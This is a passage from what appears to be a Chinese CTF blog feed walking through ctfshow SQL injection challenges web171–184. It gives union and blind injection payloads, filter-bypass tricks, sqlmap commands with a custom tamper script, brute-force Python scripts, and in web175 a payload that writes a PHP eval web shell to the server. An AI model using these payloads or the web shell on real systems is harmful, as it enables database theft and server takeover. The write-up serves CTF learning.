lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload[::-<span class="number">1</span>].encode()</span><br><span class="line">        payload = base64.b64encode(payload)</span><br><span class="line">        payload = (payload.decode())[::-<span class="number">1</span>]</span><br><span class="line">        payload = base64.b64encode(payload.encode())</span><br><span class="line">        retVal = payload.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>查表, 这次是ctfshow_flavi</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://0e357e82-37a8-43ec-9606-dd90eee5d390.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://0e357e82-37a8-43ec-9606-dd90eee5d390.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=urg0ta0238vngcc04h9p5mll50&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://0e357e82-37a8-43ec-9606-dd90eee5d390.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--method</span>=PUT <span class="literal">--header</span>=content<span class="literal">-type</span>:text/plain <span class="literal">--safe-url</span>=<span class="string">&quot;http://0e357e82-37a8-43ec-9606-dd90eee5d390.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=urg0ta0238vngcc04h9p5mll50&quot;</span> <span class="literal">--tamper</span>=personal <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_flavi <span class="literal">--dump</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> MySQL </tag>
            
            <tag> 绕过 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL盲注 </tag>
            
            <tag> sqlmap </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_sql注入_1</title>
      <link href="/article/ctfshow-webbasic-sql-1/"/>
      <url>/article/ctfshow-webbasic-sql-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>sql注入</h1><hr><p>推荐先有一个本地的数据库进行指令测试, 而且我做起来我认为难度至少是进阶的.</p><blockquote><p>如果没有任何思路应该先去做一些更简单的ctf题目顺便学一些mysql数据库的指令, 还需要会一些脚本语言</p></blockquote><h2 id="web171"><a class="header-anchor" href="#web171">¶</a>web171</h2><ul><li>描述: 从此题开始的150道题全部为sql注入，准备好了吗？</li></ul><p>题目给出了查询语句, 而且似乎没有过滤:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>传参方式为GET, 参数为: <code>/api/?id=1&amp;page=1&amp;limit=10</code></p><p>本来想着测试一下是字符型还是数字型呢, 结果直接出flag了; payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/api/?page=1&amp;limit=10&amp;id=1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>后面发现or是如果前面成立返回前面的执行结果, 否则返回后面的结果;</p><p>在本地的测试过程中, 本题的查询语句可以用or绕过不等于flag的条件, 加上闭合的条件可以得到新的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/api/?page=1&amp;limit=10&amp;id=99&#x27;or id=&#x27;26</span><br><span class="line"></span><br><span class="line"># 执行的命令如下:</span><br><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;99&#x27;or id=&#x27;26&#x27; limit 1;</span><br></pre></td></tr></table></figure><p>而我做出的payload可使用的原因是, or判断使得where语句永远为真, 返回了整个表的内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> limit <span class="number">1</span>;</span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> username, password <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="web172"><a class="header-anchor" href="#web172">¶</a>web172</h2><ul><li>描述: 撸猫为主，要什么flag?</li></ul><p>是SELECT模块的无过滤注入2, 查询逻辑变为拼接, 返回多了个过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>传参方式: <code>url/api/v2.php?id=1&amp;page=1&amp;limit=10</code></p><p>上一题的payload就不能用了, 而且由于返回值不能含有flag, 查询要换成id</p><p>换成联合查询试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username = &#x27;flag</span><br><span class="line"></span><br><span class="line"># 现在执行的语句是</span><br><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;-1&#x27; union select id,password from ctfshow_user2 where username = &#x27;flag&#x27; limit 1;</span><br></pre></td></tr></table></figure><h2 id="web173"><a class="header-anchor" href="#web173">¶</a>web173</h2><ul><li>描述: 考察sql基础</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检查一个名为<code>$ret</code>的变量(应该是查询数据库后返回的字符串)经过<code>json_encode</code>函数编码后的字符串中是否不包含(不区分大小写)子字符串flag</p><p>注意这里列数变成了3(id,username,passwd), 所以要更改一下语句, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select id,hex(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><blockquote><p>还有md5, sha, bin</p></blockquote><h2 id="web174"><a class="header-anchor" href="#web174">¶</a>web174</h2><ul><li>描述: 考察sql基础，不要一把梭，没意思</li></ul><blockquote><p>第一次访问题目4你会发现是题目3, 直接访问<code>/select-no-waf-4.php</code>或者再点一次都行</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>回显无数字?要找到方法让回显不包含任何数字</p><p>最简单的一种方法就是执行查询语句的时候将返回值替换为非过滤的值</p><p>利用python获得payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span> </span><br><span class="line">s = <span class="string">f&quot;replace(password,<span class="subst">&#123;i&#125;</span>,&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>)&#125;</span>&#x27;)&quot;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>): </span><br><span class="line">    s = <span class="string">f&quot;replace(<span class="subst">&#123;s&#125;</span>,<span class="subst">&#123;i&#125;</span>,&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>)&#125;</span>&#x27;)&quot;</span> </span><br><span class="line"><span class="built_in">print</span>(s) </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,&#x27;g&#x27;),1,&#x27;h&#x27;),2,&#x27;i&#x27;),3,&#x27;j&#x27;),4,&#x27;k&#x27;),5,&#x27;l&#x27;),6,&#x27;m&#x27;),7,&#x27;n&#x27;),8,&#x27;o&#x27;),9,&#x27;p&#x27;) from ctfshow_user4--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240805234350894.png" alt="image-20240805234350894"></p><p>现在使用脚本还原payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;ctfshow&#123;fgggaeje-lljd-kkjd-ojoo-akhdefbmdlbb&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag = flag.replace(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(i)) + <span class="number">55</span>), <span class="built_in">str</span>(i))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240805234755675.png" alt="image-20240805234755675"></p><h2 id="web175"><a class="header-anchor" href="#web175">¶</a>web175</h2><ul><li>描述: 最后一个无过滤注入，到此你已经熟悉了基础的sql语句。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>走json是看起来不容易了, 但是可以试试其他的信道: 时间, 出网外带, 写在文件里等</p><p>比如写在网站文件里(别看说报错了, 访问以下就发现有flag了):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select username,password from ctfshow_user5 into outfile &#x27;/var/www/html/flag.txt&#x27;%23</span><br></pre></td></tr></table></figure><p>比如给网站写个马即可(同理, 直接访问)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 2,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27;%23</span><br><span class="line"></span><br><span class="line">-1&#x27;union select 1,from_base64(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+&quot;) into outfile &#x27;/var/www/html/1.php&#x27;%23</span><br></pre></td></tr></table></figure><h2 id="web176"><a class="header-anchor" href="#web176">¶</a>web176</h2><ul><li>描述: 开始过滤了</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>没有对返回的参数进行过滤, 那么可以回到web171使用的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>或者还是利用or拼接查询:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;26</span><br><span class="line">-1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web177"><a class="header-anchor" href="#web177">¶</a>web177</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过测试过滤的是空格, 可以继续用web176的payload或者换为select</p><blockquote><p>空格可以用<code>/**/</code>, <code>$IFS</code>, <code>&lt;&gt;</code>, <code>%0a</code>等绕过, 部分情况下可以用反引号, 单引号</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/or/**/username=&#x27;flag</span><br><span class="line">-1&#x27;/**/or/**/username/**/like/**/&#x27;%f%</span><br><span class="line"></span><br><span class="line"># 反引号</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),3%23</span><br><span class="line"># 单引号</span><br><span class="line">-1&#x27;/**/union/**/select&#x27;1&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),3%23</span><br></pre></td></tr></table></figure><h2 id="web178"><a class="header-anchor" href="#web178">¶</a>web178</h2><ul><li>描述: 同上</li></ul><p>也是不给看过滤, 应该是过滤空格还过滤了<code>/**/</code>, 那就换成<code>%0a</code>, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%0aor%0ausername=&#x27;flag</span><br><span class="line"></span><br><span class="line">-1&#x27;union%0aselect%0a1,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),3%23</span><br></pre></td></tr></table></figure><blockquote><p>测试过滤用<code>-1'union select 1,2,3%23</code>即可</p></blockquote><h2 id="web179"><a class="header-anchor" href="#web179">¶</a>web179</h2><ul><li>描述: 同上</li></ul><p>还是不给看过滤, 测试发现用<code>%0c</code>就可以绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername=&#x27;flag</span><br><span class="line"></span><br><span class="line">-1&#x27;union%0cselect&#x27;1&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),3%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a class="header-anchor" href="#web180">¶</a>web180</h2><ul><li>描述: 同上</li></ul><p>还是不给看过滤了啥, 似乎是最后的<code>%23</code>之类的, 经过测试之后发现以下测试可成立</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union%0cselect&#x27;1&#x27;,2,&#x27;3</span><br></pre></td></tr></table></figure><p>所以payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername=&#x27;flag</span><br><span class="line"></span><br><span class="line">-1&#x27;union%0cselect&#x27;1&#x27;,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a class="header-anchor" href="#web181">¶</a>web181</h2><ul><li>描述: 同上</li></ul><p>终于给看过滤了, 联合注入ban了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤, 别问为什么%0c能过, 我也很奇怪</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>返璞归真回到or, 因为查询语句都没变过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web182"><a class="header-anchor" href="#web182">¶</a>web182</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>利用模糊查询即可绕过对于flag的过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;%0cor%0cusername%0clike&#x27;%fla%</span><br></pre></td></tr></table></figure><h2 id="web183"><a class="header-anchor" href="#web183">¶</a>web183</h2><ul><li>描述: 同上</li></ul><p>全变了, 还挺厉害</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里的回显只有记录总数, 那么就是有就是1没有就是0, 应该是盲注</p><p><code>regexp</code>用于在字符串中搜索与正则表达式模式匹配的结果, 直接上例子吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设 ctfshow_user 表有以下记录：</span><br><span class="line">| id | pass     |  </span><br><span class="line">|  1 | password |  </span><br><span class="line">|  2 | ctf123   |  </span><br><span class="line">|  3 | secret   |  </span><br><span class="line">|  4 | ctf_flag |  </span><br><span class="line"></span><br><span class="line">执行查询 select * from ctfshow_user where pass regexp(&quot;ctf&quot;) 将返回：</span><br><span class="line">| id | pass   |  </span><br><span class="line">|  2 | ctf123 |  </span><br><span class="line">|  4 | ctf_flag |  </span><br></pre></td></tr></table></figure><p>所以可以整出payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">tableName=`ctfshow_user`where`pass`regexp(&quot;ctf...&quot;)</span><br></pre></td></tr></table></figure><p>这边是官方给的程序, 多了两个字符, 无伤大雅</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒发送不超过5个请求</span></span><br><span class="line">url = <span class="string">&quot;http://149a696c-8ee7-4dfa-ab40-c880151a92e8.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag + x)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># &#123;ed3cafbe-3c08-4f03-a681-00caea535ae4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web184"><a class="header-anchor" href="#web184">¶</a>web184</h2><ul><li>描述: 过滤的有点多</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>可以查阅mysql<a href="https://dev.mysql.com/doc/refman/8.4/en/select.html">官网的select语句</a>查看有什么可以替换的</p><p>结合查询语句, 发现可以执行的语句如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from user group by username having username=&#x27;flag&#x27;</span><br><span class="line">select count(*) from user group by username having username regexp(0x666c6167)</span><br><span class="line"># flag的十六进制</span><br></pre></td></tr></table></figure><p>可以得到payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">tableName=ctfshow_user group by pass having pass regexp(0x...)</span><br></pre></td></tr></table></figure><p>转换0x的函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a +=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 换一种也行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">input_str</span>):</span><br><span class="line">    hex_list = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">        hex_list.append(<span class="built_in">hex</span>(<span class="built_in">ord</span>(char))[<span class="number">2</span>:])  <span class="comment"># 直接取 &#x27;0x&#x27; 后的部分</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(hex_list)</span><br></pre></td></tr></table></figure><p>稍微改一下官方wp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒发送不超过5个请求</span></span><br><span class="line">url = <span class="string">&quot;http://6fa72a2a-0ca0-4882-b307-24f315e1804b.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">input_str</span>):</span><br><span class="line">    hex_list = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">        hex_list.append(<span class="built_in">hex</span>(<span class="built_in">ord</span>(char))[<span class="number">2</span>:])  <span class="comment"># 直接取 &#x27;0x&#x27; 